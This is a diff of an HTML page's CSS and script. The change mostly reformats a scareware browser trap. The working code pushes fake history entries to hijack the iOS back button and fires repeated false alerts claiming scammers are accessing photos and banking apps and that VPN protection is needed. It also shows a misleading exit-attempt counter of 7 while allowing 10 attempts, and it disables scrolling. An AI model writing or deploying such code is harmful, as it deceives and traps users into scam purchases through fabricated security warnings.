@@ -37,7 +37,7 @@
 
     .alert-box {
       background: #fff;
-      border: none; /* Red border removed */
+      border: none;
       border-radius: 18px;
       padding: 25px;
       max-width: 400px;
@@ -142,63 +142,62 @@
   </div>
 
   <script>
-  let attempts = 0;
-  const maxAttempts = 10; // now 10 actual attempts allowed
-  const visibleMax = 7; // but still show only 7 in the UI
-  const cancelBtn = document.getElementById('cancelBtn');
-  const exitAttemptsText = document.getElementById('exitAttempts');
-  const alertBox = document.getElementById('alertBox');
+    let attempts = 0;
+    const maxAttempts = 10; // Actual back attempts allowed
+    const visibleMax = 7; // UI shows only up to 7
+    const cancelBtn = document.getElementById('cancelBtn');
+    const exitAttemptsText = document.getElementById('exitAttempts');
+    const alertBox = document.getElementById('alertBox');
 
-  // Push 10 fake history states to trap iOS back button
-  for (let i = 0; i < 10; i++) {
-    history.pushState({}, '', location.href);
-  }
-
-  // Trap back navigation
-  window.onpopstate = function () {
-    history.pushState({}, '', location.href);
-    handleExitAttempt();
-  };
-
-  function handleExitAttempt() {
-    attempts++;
-    const messages = [
-      "iOS Security Risk Detected!",
-      "Scammers are accessing your photos!",
-      "Your banking app is visible!",
-      "Immediate VPN Protection Needed!",
-      "Critical: iCloud Access Risk!",
-      "Final Warning: Stop Exit!",
-      "You're at maximum risk!",
-      "You're ignoring system protection!",
-      "Your iPhone remains vulnerable!",
-      "Last chance: Lockdown recommended!"
-    ];
-
-    if (attempts <= maxAttempts) {
-      // Show two alerts per attempt
-      alert(`⚠️ ${messages[(attempts * 2) - 2] || messages[6]}`);
-      alert(`⚠️ ${messages[(attempts * 2) - 1] || messages[7]}`);
-
-      // Show only up to 7 in UI
-      const shown = Math.min(attempts, visibleMax);
-      exitAttemptsText.textContent = `Exit attempts: ${shown} / 7`;
-
-      // Shake effect
-      alertBox.style.animation = "shake 0.4s";
-      setTimeout(() => alertBox.style.animation = "", 500);
-    } else {
-      // Let them exit
-      window.location.href = "about:blank";
+    // Push 10 fake history states to trap iOS back button
+    for (let i = 0; i < 10; i++) {
+      history.pushState({}, '', location.href);
     }
-  }
 
-  cancelBtn.addEventListener('click', handleExitAttempt);
+    // Trap back navigation
+    window.onpopstate = function () {
+      history.pushState({}, '', location.href);
+      handleExitAttempt();
+    };
 
-  // Prevent scroll
-  document.addEventListener('touchmove', function (e) {
-    e.preventDefault();
-  }, { passive: false });
-</script>
+    function handleExitAttempt() {
+      attempts++;
+      const messages = [
+        "iOS Security Risk Detected!",
+        "Scammers are accessing your photos!",
+        "Your banking app is visible!",
+        "Immediate VPN Protection Needed!",
+        "Critical: iCloud Access Risk!",
+        "Final Warning: Stop Exit!",
+        "You're at maximum risk!",
+        "You're ignoring system protection!",
+        "Your iPhone remains vulnerable!",
+        "Last chance: Lockdown recommended!"
+      ];
+
+      if (attempts <= maxAttempts) {
+        // Show 2 alerts per back attempt
+        alert(`⚠️ ${messages[(attempts * 2) - 2] || messages[6]}`);
+        alert(`⚠️ ${messages[(attempts * 2) - 1] || messages[7]}`);
+
+        // Only display up to 7 attempts in UI
+        const shown = Math.min(attempts, visibleMax);
+        exitAttemptsText.textContent = `Exit attempts: ${shown} / 7`;
+
+        // Shake animation
+        alertBox.style.animation = "shake 0.4s";
+        setTimeout(() => alertBox.style.animation = "", 500);
+      } else {
+        window.location.href = "about:blank"; // Let them exit
+      }
+    }
+
+    cancelBtn.addEventListener('click', handleExitAttempt);
+
+    // Prevent scroll/swipe
+    document.addEventListener('touchmove', function (e) {
+      e.preventDefault();
+    }, { passive: false });
+  </script>
 </body>
 </html>
